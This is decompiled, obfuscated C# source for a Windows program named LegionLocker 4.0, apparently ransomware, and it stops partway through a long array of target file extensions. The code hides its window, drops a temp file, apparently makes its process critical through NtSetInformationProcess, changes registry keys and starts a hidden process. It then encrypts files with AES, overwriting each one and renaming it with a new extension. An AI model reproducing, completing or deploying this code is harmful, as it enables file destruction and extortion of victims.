using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace LegionLocker4._0;

public class Form1 : Form
{
	private const int SW_HIDE_002D0 = 0;

	private const int SW_SHOW_002D1 = 5;

	private string temp_002D2 = Path.GetTempPath();

	private IContainer components_002D3 = null;

	private Timer timer3_002D4;

	private Timer timer1_002D5;

	public Form1()
	{
		InitializeComponent_002D4();
	}

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd_002D0, int nCmdShow_002D1);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess_002D0, int processInformationClass_002D1, ref int processInformation_002D2, int processInformationLength_002D3);

	private void Form1_Load_002D0(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(_Constants_Generated_002D5.Field_0_002D0);
		((Form)this).set_ShowInTaskbar(false);
		File.WriteAllBytes(temp_002D2 + _Constants_Generated_002D5.Field_1_002D1, LegionLocker4__0_Properties_Resources_002D1.wp_002D3);
		int processInformation_002D = 1;
		int field_2_002D = _Constants_Generated_002D5.Field_2_002D2;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, field_2_002D, ref processInformation_002D, 4);
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_Constants_Generated_002D5.Field_3_002D3);
		registryKey.SetValue(_Constants_Generated_002D5.Field_4_002D4, 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(_Constants_Generated_002D5.Field_5_002D5);
		registryKey2.SetValue(_Constants_Generated_002D5.Field_6_002D6, _Constants_Generated_002D5.Field_7_002D7, RegistryValueKind.String);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = _Constants_Generated_002D5.Field_8_002D8;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = _Constants_Generated_002D5.Field_9_002D9;
		Process.Start(processStartInfo);
		timer1_002D5.Start();
		Encrypt();
	}

	public static string Base64Decode(string base64EncodeData_002D0)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodeData_002D0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted_002D0, byte[] passwordBytes_002D1)
	{
		byte[] result = null;
		byte[] array = new byte[_Constants_Generated_002D5.Field_10_002Da];
		RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] salt = array;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = _Constants_Generated_002D5.Field_11_002Db;
			rijndaelManaged.BlockSize = _Constants_Generated_002D5.Field_12_002Dc;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes_002D1, salt, _Constants_Generated_002D5.Field_13_002Dd);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted_002D0, 0, bytesToBeEncrypted_002D0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void EncryptFile(string file_002D0, string password_002D1)
	{
		byte[] bytesToBeEncrypted_002D = File.ReadAllBytes(file_002D0);
		byte[] bytes = Encoding.UTF8.GetBytes(password_002D1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted_002D, bytes);
		File.WriteAllBytes(file_002D0, bytes2);
		File.Move(file_002D0, file_002D0 + _Constants_Generated_002D5.Field_14_002De);
	}

	public void encryptDirectory(string location_002D0, string password_002D1)
	{
		try
		{
			string[] array = new string[_Constants_Generated_002D5.Field_15_002Df];
			array[0] = _Constants_Generated_002D5.Field_16_002Dg;
			array[1] = _Constants_Generated_002D5.Field_17_002Dh;
			array[2] = _Constants_Generated_002D5.Field_18_002Di;
			array[3] = _Constants_Generated_002D5.Field_19_002Dj;
			array[4] = _Constants_Generated_002D5.Field_20_002Dk;
			array[5] = _Constants_Generated_002D5.Field_21_002Dl;
			array[6] = _Constants_Generated_002D5.Field_22_002Dm;
			array[7] = _Constants_Generated_002D5.Field_23_002Dn;
			array[8] = _Constants_Generated_002D5.Field_24_002Do;
			array[_Constants_Generated_002D5.Field_25_002Dp] = _Constants_Generated_002D5.Field_26_002Dq;
			array[_Constants_Generated_002D5.Field_27_002Dr] = _Constants_Generated_002D5.Field_28_002Ds;
			array[_Constants_Generated_002D5.Field_29_002Dt] = _Constants_Generated_002D5.Field_30_002Du;
			array[_Constants_Generated_002D5.Field_31_002Dv] = _Constants_Generated_002D5.Field_32_002Dw;
			array[_Constants_Generated_002D5.Field_33_002Dx] = _Constants_Generated_002D5.Field_34_002Dy;
			array[_Constants_Generated_002D5.Field_35_002Dz] = _Constants_Generated_002D5.Field_36_002DA;
			array[_Constants_Generated_002D5.Field_37_002DB] = _Constants_Generated_002D5.Field_38_002DC;
			array[_Constants_Generated_002D5.Field_39_002DD] = _Constants_Generated_002D5.Field_40_002DE;
			array[_Constants_Generated_002D5.Field_41_002DF] = _Constants_Generated_002D5.Field_42_002DG;
			array[_Constants_Generated_002D5.Field_43_002DH] = _Constants_Generated_002D5.Field_44_002DI;
			array[_Constants_Generated_002D5.Field_45_002DJ] = _Constants_Generated_002D5.Field_46_002DK;
			array[_Constants_Generated_002D5.Field_47_002DL] = _Constants_Generated_002D5.Field_48_002DM;
			array[_Constants_Generated_002D5.Field_49_002DN] = _Constants_Generated_002D5.Field_50_002DO;
			array[_Constants_Generated_002D5.Field_51_002DP] = _Constants_Generated_002D5.Field_52_002DQ;
			array[_Constants_Generated_002D5.Field_53_002DR] = _Constants_Generated_002D5.Field_54_002DS;
			array[_Constants_Generated_002D5.Field_55_002DT] = _Constants_Generated_002D5.Field_56_002DU;
			array[_Constants_Generated_002D5.Field_57_002DV] = _Constants_Generated_002D5.Field_58_002DW;
			array[_Constants_Generated_002D5.Field_59_002DX] = _Constants_Generated_002D5.Field_60_002DY;
			array[_Constants_Generated_002D5.Field_61_002DZ] = _Constants_Generated_002D5.Field_62_002D01;
			array[_Constants_Generated_002D5.Field_63_002D11] = _Constants_Generated_002D5.Field_64_002D21;
			array[_Constants_Generated_002D5.Field_65_002D31] = _Constants_Generated_002D5.Field_66_002D41;
			array[_Constants_Generated_002D5.Field_67_002D51] = _Constants_Generated_002D5.Field_68_002D61;
			array[_Constants_Generated_002D5.Field_69_002D71] = _Constants_Generated_002D5.Field_70_002D81;
			array[_Constants_Generated_002D5.Field_71_002D91] = _Constants_Generated_002D5.Field_72_002Da1;
			array[_Constants_Generated_002D5.Field_73_002Db1] = _Constants_Generated_002D5.Field_74_002Dc1;
			array[_Constants_Generated_002D5.Field_75_002Dd1] = _Constants_Generated_002D5.Field_76_002De1;
			array[_Constants_Generated_002D5.Field_77_002Df1] = _Constants_Generated_002D5.Field_78_002Dg1;
			array[_Constants_Generated_002D5.Field_79_002Dh1] = _Constants_Generated_002D5.Field_80_002Di1;
			array[_Constants_Generated_002D5.Field_81_002Dj1] = _Constants_Generated_002D5.Field_82_002Dk1;
			array[_Constants_Generated_002D5.Field_83_002Dl1] = _Constants_Generated_002D5.Field_84_002Dm1;
			array[_Constants_Generated_002D5.Field_85_002Dn1] = _Constants_Generated_002D5.Field_86_002Do1;
			array[_Constants_Generated_002D5.Field_87_002Dp1] = _Constants_Generated_002D5.Field_88_002Dq1;
			array[_Constants_Generated_002D5.Field_89_002Dr1] = _Constants_Generated_002D5.Field_90_002Ds1;
			array[_Constants_Generated_002D5.Field_91_002Dt1] = _Constants_Generated_002D5.Field_92_002Du1;
			array[_Constants_Generated_002D5.Field_93_002Dv1] = _Constants_Generated_002D5.Field_94_002Dw1;
			array[_Constants_Generated_002D5.Field_95_002Dx1] = _Constants_Generated_002D5.Field_96_002Dy1;
			array[_Constants_Generated_002D5.Field_97_002Dz1] = _Constants_Generated_002D5.Field_98_002DA1;
			array[_Constants_Generated_002D5.Field_99_002DB1] = _Constants_Generated_002D5.Field_100_002DC1;
			array[_Constants_Generated_002D5.Field_101_002DD1] = _Constants_Generated_002D5.Field_102_002DE1;
			array[_Constants_Generated_002D5.Field_103_002DF1] = _Constants_Generated_002D5.Field_104_002DG1;
			array[_Constants_Generated_002D5.Field_105_002DH1] = _Constants_Generated_002D5.Field_106_002DI1;
			array[_Constants_Generated_002D5.Field_107_002DJ1] = _Constants_Generated_002D5.Field_108_002DK1;
			array[_Constants_Generated_002D5.Field_109_002DL1] = _Constants_Generated_002D5.Field_110_002DM1;
			array[_Constants_Generated_002D5.Field_111_002DN1] = _Constants_Generated_002D5.Field_112_002DO1;
			array[_Constants_Generated_002D5.Field_113_002DP1] = _Constants_Generated_002D5.Field_114_002DQ1;
			array[_Constants_Generated_002D5.Field_115_002DR1] = _Constants_Generated_002D5.Field_116_002DS1;
			array[_Constants_Generated_002D5.Field_117_002DT1] = _Constants_Generated_002D5.Field_118_002DU1;
			array[_Constants_Generated_002D5.Field_119_002DV1] = _Constants_Generated_002D5.Field_120_002DW1;
			array[_Constants_Generated_002D5.Field_121_002DX1] = _Constants_Generated_002D5.Field_122_002DY1;
			array[_Constants_Generated_002D5.Field_123_002DZ1] = _Constants_Generated_002D5.Field_124_002D02;
			array[_Constants_Generated_002D5.Field_125_002D12] = _Constants_Generated_002D5.Field_126_002D22;
			array[_Constants_Generated_002D5.Field_127_002D32] = _Constants_Generated_002D5.Field_128_002D42;
			array[_Constants_Generated_002D5.Field_129_002D52] = _Constants_Generated_002D5.Field_130_002D62;
			array[_Constants_Generated_002D5.Field_131_002D72] = _Constants_Generated_002D5.Field_132_002D82;
			array[_Constants_Generated_002D5.Field_133_002D92] = _Constants_Generated_002D5.Field_134_002Da2;
			array[_Constants_Generated_002D5.Field_135_002Db2] = _Constants_Generated_002D5.Field_136_002Dc2;
			array[_Constants_Generated_002D5.Field_137_002Dd2] = _Constants_Generated_002D5.Field_138_002De2;
			array[_Constants_Generated_002D5.Field_139_002Df2] = _Constants_Generated_002D5.Field_140_002Dg2;
			array[_Constants_Generated_002D5.Field_141_002Dh2] = _Constants_Generated_002D5.Field_142_002Di2;
			array[_Constants_Generated_002D5.Field_143_002Dj2] = _Constants_Generated_002D5.Field_144_002Dk2;
			array[_Constants_Generated_002D5.Field_145_002Dl2] = _Constants_Generated_002D5.Field_146_002Dm2;
			array[_Constants_Generated_002D5.Field_147_002Dn2] = _Constants_Generated_002D5.Field_148_002Do2;
			array[_Constants_Generated_002D5.Field_149_002Dp2] = _Constants_Generated_002D5.Field_150_002Dq2;
			array[_Constants_Generated_002D5.Field_151_002Dr2] = _Constants_Generated_002D5.Field_152_002Ds2;
			array[_Constants_Generated_002D5.Field_153_002Dt2] = _Constants_Generated_002D5.Field_154_002Du2;
			array[_Constants_Generated_002D5.Field_155_002Dv2] = _Constants_Generated_002D5.Field_156_002Dw2;
			array[_Constants_Generated_002D5.Field_157_002Dx2] = _Constants_Generated_002D5.Field_158_002Dy2;
			array[_Constants_Generated_002D5.Field_159_002Dz2] = _Constants_Generated_002D5.Field_160_002DA2;
			array[_Constants_Generated_002D5.Field_161_002DB2] = _Constants_Generated_002D5.Field_162_002DC2;
			array[_Constants_Generated_002D5.Field_163_002DD2] = _Constants_Generated_002D5.Field_164_002DE2;
			array[_Constants_Generated_002D5.Field_165_002DF2] = _Constants_Generated_002D5.Field_166_002DG2;
			array[_Constants_Generated_002D5.Field_167_002DH2] = _Constants_Generated_002D5.Field_168_002DI2;
			array[_Constants_Generated_002D5.Field_169_002DJ2] = _Constants_Generated_002D5.Field_170_002DK2;
			array[_Constants_Generated_002D5.Field_171_002DL2] = _Constants_Generated_002D5.Field_172_002DM2;
			array[_Constants_Generated_002D5.Field_173_002DN2] = _Constants_Generated_002D5.Field_174_002DO2;
			array[_Constants_Generated_002D5.Field_175_002DP2] = _Constants_Generated_002D5.Field_176_002DQ2;
			array[_Constants_Generated_002D5.Field_177_002DR2] = _Constants_Generated_002D5.Field_178_002DS2;
			array[_Constants_Generated_002D5.Field_179_002DT2] = _Constants_Generated_002D5.Field_180_002DU2;
			array[_Constants_Generated_002D5.Field_181_002DV2] = _Constants_Generated_002D5.Field_182_002DW2;
			array[_Constants_Generated_002D5.Field_183_002DX2] = _Constants_Generated_002D5.Field_184_002DY2;
			array[_Constants_Generated_002D5.Field_185_002DZ2] = _Constants_Generated_002D5.Field_186_002D03;
			array[_Constants_Generated_002D5.Field_187_002D13] = _Constants_Generated_002D5.Field_188_002D23;
			array[_Constants_Generated_002D5.Field_189_002D33] = _Constants_Generated_002D5.Field_190_002D43;
			array[_Constants_Generated_002D5.Field_191_002D53] = _Constants_Generated_002D5.Field_192_002D63;
			array[_Constants_Generated_002D5.Field_193_002D73] = _Constants_Generated_002D5.Field_194_002D83;
			array[_Constants_Generated_002D5.Field_195_002D93] = _Constants_Generated_002D5.Field_196_002Da3;
			array[_Constants_Generated_002D5.Field_197_002Db3] = _Constants_Generated_002D5.Field_198_002Dc3;
			array[_Constants_Generated_002D5.Field_199_002Dd3] = _Constants_Generated_002D5.Field_200_002De3;
			array[_Constants_Generated_002D5.Field_201_002Df3] = _Constants_Generated_002D5.Field_202_002Dg3;
			array[_Constants_Generated_002D5.Field_203_002Dh3] = _Constants_Generated_002D5.Field_204_002Di3;
			array[_Constants_Generated_002D5.Field_205_002Dj3] = _Constants_Generated_002D5.Field_206_002Dk3;
			array[_Constants_Generated_002D5.Field_207_002Dl3] = _Constants_Generated_002D5.Field_208_002Dm3;
			array[_Constants_Generated_002D5.Field_209_002Dn3] = _Constants_Generated_002D5.Field_210_002Do3;
			array[_Constants_Generated_002D5.Field_211_002Dp3] = _Constants_Generated_002D5.Field_212_002Dq3;
			array[_Constants_Generated_002D5.Field_213_002Dr3] = _Constants_Generated_002D5.Field_214_002Ds3;
			array[_Constants_Generated_002D5.Field_215_002Dt3] = _Constants_Generated_002D5.Field_216_002Du3;
			array[_Constants_Generated_002D5.Field_217_002Dv3] = _Constants_Generated_002D5.Field_218_002Dw3;
			array[_Constants_Generated_002D5.Field_219_002Dx3] = _Constants_Generated_002D5.Field_220_002Dy3;
			array[_Constants_Generated_002D5.Field_221_002Dz3] = _Constants_Generated_002D5.Field_222_002DA3;
			array[_Constants_Generated_002D5.Field_223_002DB3] = _Constants_Generated_002D5.Field_224_002DC3;
			array[_Constants_Generated_002D5.Field_225_002DD3] = _Constants_Generated_002D5.Field_226_002DE3;
			array[_Constants_Generated_002D5.Field_227_002DF3] = _Constants_Generated_002D5.Field_228_002DG3;
			array[_Constants_Generated_002D5.Field_229_002DH3] = _Constants_Generated_002D5.Field_230_002DI3;
			array[_Constants_Generated_002D5.Field_231_002DJ3] = _Constants_Generated_002D5.Field_232_002DK3;
			array[_Constants_Generated_002D5.Field_233_002DL3] = _Constants_Generated_002D5.Field_234_002DM3;
			array[_Constants_Generated_002D5.Field_235_002DN3] = _Constants_Generated_002D5.Field_236_002DO3;
			array[_Constants_Generated_002D5.Field_237_002DP3] = _Constants_Generated_002D5.Field_238_002DQ3;
			array[_Constants_Generated_002D5.Field_239_002DR3] = _Constants_Generated_002D5.Field_240_002DS3;
			array[_Constants_Generated_002D5.Field_241_002DT3] = _Constants_Generated_002D5.Field_242_002DU3;
			array[_Constants_Generated_002D5.Field_243_002DV3] = _Constants_Generated_002D5.Field_244_002DW3;
			array[_Constants_Generated_002D5.Field_245_002DX3] = _Constants_Generated_002D5.Field_246_002DY3;
			array[_Constants_Generated_002D5.Field_247_002DZ3] = _Constants_Generated_002D5.Field_248_002D04;
			array[_Constants_Generated_002D5.Field_249_002D14] = _Constants_Generated_002D5.Field_250_002D24;
			array[_Constants_Generated_002D5.Field_251_002D34] = _Constants_Generated_002D5.Field_252_002D44;
			array[_Constants_Generated_002D5.Field_253_002D54] = _Constants_Generated_002D5.Field_254_002D64;
			array[_Constants_Generated_002D5.Field_255_002D74] = _Constants_Generated_002D5.Field_256_002D84;
			array[_Constants_Generated_002D5.Field_257_002D94] = _Constants_Generated_002D5.Field_258_002Da4;
			array[_Constants_Generated_002D5.Field_259_002Db4] = _Constants_Generated_002D5.Field_260_002Dc4;
			array[_Constants_Generated_002D5.Field_261_002Dd4] = _Constants_Generated_002D5.Field_262_002De4;
			array[_Constants_Generated_002D5.Field_263_002Df4] = _Constants_Generated_002D5.Field_264_002Dg4;
			array[_Constants_Generated_002D5.Field_265_002Dh4] = _Constants_Generated_002D5.Field_266_002Di4;
			array[_Constants_Generated_002D5.Field_267_002Dj4] = _Constants_Generated_002D5.Field_268_002Dk4;
			array[_Constants_Generated_002D5.Field_269_002Dl4] = _Constants_Generated_002D5.Field_270_002Dm4;
			array[_Constants_Generated_002D5.Field_271_002Dn4] = _Constants_Generated_002D5.Field_272_002Do4;
			array[_Constants_Generated_002D5.Field_273_002Dp4] = _Constants_Generated_002D5.Field_274_002Dq4;
			array[_Constants_Generated_002D5.Field_275_002Dr4] = _Constants_Generated_002D5.Field_276_002Ds4;
			array[_Constants_Generated_002D5.Field_277_002Dt4] = _Constants_Generated_002D5.Field_278_002Du4;
			array[_Constants_Generated_002D5.Field_279_002Dv4] = _Constants_Generated_002D5.Field_280_002Dw4;
			array[_Constants_Generated_002D5.Field_281_002Dx4] = _Constants_Generated_002D5.Field_282_002Dy4;
			array[_Constants_Generated_002D5.Field_283_002Dz4] = _Constants_Generated_002D5.Field_284_002DA4;
			array[_Constants_Generated_002D5.Field_285_002DB4] = _Constants_Generated_002D5.Field_286_002DC4;
			array[_Constants_Generated_002D5.Field_287_002DD4] = _Constants_Generated_002D5.Field_288_002DE4;
			array[_Constants_Generated_002D5.Field_289_002DF4] = _Constants_Generated_002D5.Field_290_002DG4;
			array[_Constants_Generated_002D5.Field_291_002DH4] = _Constants_Generated_002D5.Field_292_002DI4;
			array[_Constants_Generated_002D5.Field_293_002DJ4] = _Constants_Generated_002D5.Field_294_002DK4;
			array[_Constants_Generated_002D5.Field_295_002DL4] = _Constants_Generated_002D5.Field_296_002DM4;
			array[_Constants_Generated_002D5.Field_297_002DN4] = _Constants_Generated_002D5.Field_298_002DO4;
			array[_Constants_Generated_002D5.Field_299_002DP4] = _Constants_Generated_002D5.Field_300_002DQ4;
			array[_Constants_Generated_002D5.Field_301_002DR4] = _Constants_Generated_002D5.Field_302_002DS4;
			array[_Constants_Generated_002D5.Field_303_002DT4] = _Constants_Generated_002D5.Field_304_002DU4;
			array[_Constants_Generated_002D5.Field_305_002DV4] = _Constants_Generated_002D5.Field_306_002DW4;
			array[_Constants_Generated_002D5.Field_307_002DX4] = _Constants_Generated_002D5.Field_308_002DY4;
			array[_Constants_Generated_002D5.Field_309_002DZ4] = _Constants_Generated_002D5.Field_310_002D05;
			array[_Constants_Generated_002D5.Field_311_002D15] = _Constants_Generated_002D5.Field_312_002D25;
			array[_Constants_Generated_002D5.Field_313_002D35] = _Constants_Generated_002D5.Field_314_002D45;
			array[_Constants_Generated_002D5.Field_315_002D55] = _Constants_Generated_002D5.Field_316_002D65;
			array[_Constants_Generated_002D5.Field_317_002D75] = _Constants_Generated_002D5.Field_318_002D85;
			array[_Constants_Generated_002D5.Field_319_002D95] = _Constants_Generated_002D5.Field_320_002Da5;
			array[_Constants_Generated_002D5.Field_321_002Db5] = _Constants_Generated_002D5.Field_322_002Dc5;
			array[_Constants_Generated_002D5.Field_323_002Dd5] = _Constants_Generated_002D5.Field_324_002De5;
			array[_Constants_Generated_002D5.Field_325_002Df5] = _Constants_Generated_002D5.Field_326_002Dg5;
			array[_Constants_Generated_002D5.Field_327_002Dh5] = _Constants_Generated_002D5.Field_328_002Di5;
			array[_Constants_Generated_002D5.Field_329_002Dj5] = _Constants_Generated_002D5.Field_330_002Dk5;
			array[_Constants_Generated_002D5.Field_331_002Dl5] = _Constants_Generated_002D5.Field_332_002Dm5;
			array[_Constants_Generated_002D5.Field_333_002Dn5] = _Constants_Generated_002D5.Field_334_002Do5;
			array[_Constants_Generated_002D5.Field_335_002Dp5] = _Constants_Generated_002D5.Field_336_002Dq5;
			array[_Constants_Generated_002D5.Field_337_002Dr5] = _Constants_Generated_002D5.Field_338_002Ds5;
			array[_Constants_Generated_002D5.Field_339_002Dt5] = _Constants_Generated_002D5.Field_340_002Du5;
			array[_Constants_Generated_002D5.Field_341_002Dv5] = _Constants_Generated_002D5.Field_342_002Dw5;
			array[_Constants_Generated_002D5.Field_343_002Dx5] = _Constants_Generated_002D5.Field_344_002Dy5;
			array[_Constants_Generated_002D5.Field_345_002Dz5] = _Constants_Generated_002D5.Field_346_002DA5;
			array[_Constants_Generated_002D5.Field_347_002DB5] = _Constants_Generated_002D5.Field_348_002DC5;
			array[_Constants_Generated_002D5.Field_349_002DD5] = _Constants_Generated_002D5.Field_350_002DE5;
			array[_Constants_Generated_002D5.Field_351_002DF5] = _Constants_Generated_002D5.Field_352_002DG5;
			array[_Constants_Generated_002D5.Field_353_002DH5] = _Constants_Generated_002D5.Field_354_002DI5;
			array[_Constants_Generated_002D5.Field_355_002DJ5] = _Constants_Generated_002D5.Field_356_002DK5;
			array[_Constants_Generated_002D5.Field_357_002DL5] = _Constants_Generated_002D5.Field_358_002DM5;
			array[_Constants_Generated_002D5.Field_359_002DN5] = _Constants_Generated_002D5.Field_360_002DO5;
			array[_Constants_Generated_002D5.Field_361_002DP5] = _Constants_Generated_002D5.Field_362_002DQ5;
			array[_Constants_Generated_002D5.Field_363_002DR5] = _Constants_Generated_002D5.Field_364_002DS5;
			array[_Constants_Generated_002D5.Field_365_002DT5] = _Constants_Generated_002D5.Field_366_002DU5;
			array[_Constants_Generated_002D5.Field_367_002DV5] = _Constants_Generated_002D5.Field_368_002DW5;
			array[_Constants_Generated_002D5.Field_369_002DX5] = _Constants_Generated_002D5.Field_370_002DY5;
			array[_Constants_Generated_002D5.Field_371_002DZ5] = _Constants_Generated_002D5.Field_372_002D06;
			array[_Constants_Generated_002D5.Field_373_002D16] = _Constants_Generated_002D5.Field_374_002D26;
			array[_Constants_Generated_002D5.Field_375_002D36] = _Constants_Generated_002D5.Field_376_002D46;
			array[_Constants_Generated_002D5.Field_377_002D56] = _Constants_Generated_002D5.Field_378_002D66;
			array[_Constants_Generated_002D5.Field_379_002D76] = _Constants_Generated_002D5.Field_380_002D86;
			array[_Constants_Generated_002D5.Field_381_002D96] = _Constants_Generated_002D5.Field_382_002Da6;
			array[_Constants_Generated_002D5.Field_383_002Db6] = _Constants_Generated_002D5.Field_384_002Dc6;
			array[_Constants_Generated_002D5.Field_385_002Dd6] = _Constants_Generated_002D5.Field_386_002De6;
			array[_Constants_Generated_002D5.Field_387_002Df6] = _Constants_Generated_002D5.Field_388_002Dg6;
			array[_Constants_Generated_002D5.Field_389_002Dh6] = _Constants_Generated_002D5.Field_390_002Di6;
			array[_Constants_Generated_002D5.Field_391_002Dj6] = _Constants_Generated_002D5.Field_392_002Dk6;
			array[_Constants_Generated_002D5.Field_393_002Dl6] = _Constants_Generated_002D5.Field_394_002Dm6;
			array[_Constants_Generated_002D5.Field_395_002Dn6] = _Constants_Generated_002D5.Field_396_002Do6;
			array[_Constants_Generated_002D5.Field_397_002Dp6] = _Constants_Generated_002D5.Field_398_002Dq6;
			array[_Constants_Generated_002D5.Field_399_002Dr6] = _Constants_Generated_002D5.Field_400_002Ds6;
			array[_Constants_Generated_002D5.Field_401_002Dt6] = _Constants_Generated_002D5.Field_402_002Du6;
			array[_Constants_Generated_002D5.Field_403_002Dv6] = _Constants_Generated_002D5.Field_404_002Dw6;
			array[_Constants_Generated_002D5.Field_405_002Dx6] = _Constants_Generated_002D5.Field_406_002Dy6;
			array[_Constants_Generated_002D5.Field_407_002Dz6] = _Constants_Generated_002D5.Field_408_002DA6;
			array[_Constants_Generated_002D5.Field_409_002DB6] = _Constants_Generated_002D5.Field_410_002DC6;
			array[_Constants_Generated_002D5.Field_411_002DD6] = _Constants_Generated_002D5.Field_412_002DE6;
			array[_Constants_Generated_002D5.Field_413_002DF6] = _Constants_Generated_002D5.Field_414_002DG6;
			array[_Constants_Generated_002D5.Field_415_002DH6] = _Constants_Generated_002D5.Field_416_002DI6;
			array[_Constants_Generated_002D5.Field_417_002DJ6] = _Constants_Generated_002D5.Field_418_002DK6;
			array[_Constants_Generated_002D5.Field_419_002DL6] = _Constants_Generated_002D5.Field_420_002DM6;
			array[_Constants_Generated_002D5.Field_421_002DN6] = _Constants_Generated_002D5.Field_422_002DO6;
			array[_Constants_Generated_002D5.Field_423_002DP6] = _Constants_Generated_002D5.Field_424_002DQ6;
			array[_Constants_Generated_002D5.Field_425_002DR6] = _Constants_Generated_002D5.Field_426_002DS6;
			array[_Constants_Generated_002D5.Field_427_002DT6] = _Constants_Generated_002D5.Field_428_002DU6;
			array[_Constants_Generated_002D5.Field_429_002DV6] = _Constants_Generated_002D5.Field_430_002DW6;
			array[_Constants_Generated_002D5.Field_431_002DX6] = _Constants_Generated_002D5.Field_432_002DY6;
			array[_Constants_Generated_002D5.Field_433_002DZ6] = _Constants_Generated_002D5.Field_434_002D07;
			array[_Constants_Generated_002D5.Field_435_002D17] = _Constants_Generated_002D5.Field_436_002D27;
			array[_Constants_Generated_002D5.Field_437_002D37] = _Constants_Generated_002D5.Field_438_002D47;
			array[_Constants_Generated_002D5.Field_439_002D57] = _Constants_Generated_002D5.Field_440_002D67;
			array[_Constants_Generated_002D5.Field_441_002D77] = _Constants_Generated_002D5.Field_442_002D87;
			array[_Constants_Generated_002D5.Field_443_002D97] = _Constants_Generated_002D5.Field_444_002Da7;
			array[_Constants_Generated_002D5.Field_445_002Db7] = _Constants_Generated_002D5.Field_446_002Dc7;
			array[_Constants_Generated_002D5.Field_447_002Dd7] = _Constants_Generated_002D5.Field_448_002De7;
			array[_Constants_Generated_002D5.Field_449_002Df7] = _Constants_Generated_002D5.Field_450_002Dg7;
			array[_Constants_Generated_002D5.Field_451_002Dh7] = _Constants_Generated_002D5.Field_452_002Di7;
			array[_Constants_Generated_002D5.Field_453_002Dj7] = _Constants_Generated_002D5.Field_454_002Dk7;
			array[_Constants_Generated_002D5.Field_455_002Dl7] = _Constants_Generated_002D5.Field_456_002Dm7;
			array[_Constants_Generated_002D5.Field_457_002Dn7] = _Constants_Generated_002D5.Field_458_002Do7;
			array[_Constants_Generated_002D5.Field_459_002Dp7] = _Constants_Generated_002D5.Field_460_002Dq7;
			array[_Constants_Generated_002D5.Field_461_002Dr7] = _Constants_Generated_002D5.Field_462_002Ds7;
			array[_Constants_Generated_002D5.Field_463_002Dt7] = _Constants_Generated_002D5.Field_464_002Du7;
			array[_Constants_Generated_002D5.Field_465_002Dv7] = _Constants_Generated_002D5.Field_466_002Dw7;
			array[_Constants_Generated_002D5.Field_467_002Dx7] = _Constants_Generated_002D5.Field_468_002Dy7;
			array[_Constants_Generated_002D5.Field_469_002Dz7] = _Constants_Generated_002D5.Field_470_002DA7;
			array[_Constants_Generated_002D5.Field_471_002DB7] = _Constants_Generated_002D5.Field_472_002DC7;
			array[_Constants_Generated_002D5.Field_473_002DD7] = _Constants_Generated_002D5.Field_474_002DE7;
			array[_Constants_Generated_002D5.Field_475_002DF7] = _Constants_Generated_002D5.Field_476_002DG7;
			array[_Constants_Generated_002D5.Field_477_002DH7] = _Constants_Generated_002D5.Field_478_002DI7;
			array[_Constants_Generated_002D5.Field_479_002DJ7] = _Constants_Generated_002D5.Field_480_002DK7;
			array[_Constants_Generated_002D5.Field_481_002DL7] = _Constants_Generated_002D5.Field_482_002DM7;
			array[_Constants_Generated_002D5.Field_483_002DN7] = _Constants_Generated_002D5.Field_484_002DO7;
			array[_Constants_Generated_002D5.Field_485_002DP7] = _Constants_Generated_002D5.Field_486_002DQ7;
			array[_Constants_Generated_002D5.Field_487_002DR7] = _Constants_Generated_002D5.Field_488_002DS7;
			array[_Constants_Generated_002D5.Field_489_002DT7] = _Constants_Generated_002D5.Field_490_002DU7;
			array[_Constants_Generated_002D5.Field_491_002DV7] = _Constants_Generated_002D5.Field_492_002DW7;
			array[_Constants_Generated_002D5.Field_493_002DX7] = _Constants_Generated_002D5.Field_494_002DY7;
			array[_Constants_Generated_002D5.Field_495_002DZ7] = _Constants_Generated_002D5.Field_496_002D08;
			array[_Constants_Generated_002D5.Field_497_002D18] = _Constants_Generated_002D5.Field_498_002D28;
			array[_Constants_Generated_002D5.Field_499_002D38] = _Constants_Generated_002D5.Field_500_002D48;
			array[_Constants_Generated_002D5.Field_501_002D58] = _Constants_Generated_002D5.Field_502_002D68;
			array[_Constants_Generated_002D5.Field_503_002D78] = _Constants_Generated_002D5.Field_504_002D88;
			array[_Constants_Generated_002D5.Field_505_002D98] = _Constants_Generated_002D5.Field_506_002Da8;
			array[_Constants_Generated_002D5.Field_507_002Db8] = _Constants_Generated_002D5.Field_508_002Dc8;
			array[_Constants_Generated_002D5.Field_509_002Dd8] = _Constants_Generated_002D5.Field_510_002De8;
			array[_Constants_Generated_002D5.Field_511_002Df8] = _Constants_Generated_002D5.Field_512_002Dg8;
			array[_Constants_Generated_002D5.Field_513_002Dh8] = _Constants_Generated_002D5.Field_514_002Di8;
